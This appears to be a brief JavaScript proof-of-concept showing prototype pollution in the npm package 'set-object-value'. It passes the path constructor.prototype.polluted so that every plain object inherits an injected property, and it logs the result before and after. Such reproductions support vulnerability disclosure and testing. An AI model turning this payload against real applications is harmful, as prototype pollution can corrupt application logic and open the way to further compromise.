var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
var setObjectValue = require('set-object-value');
obj = {};
console.log({}.polluted);
setObjectValue(obj, [
    'constructor',
    'prototype',
    'polluted'
], 'yes');
console.log({}.polluted);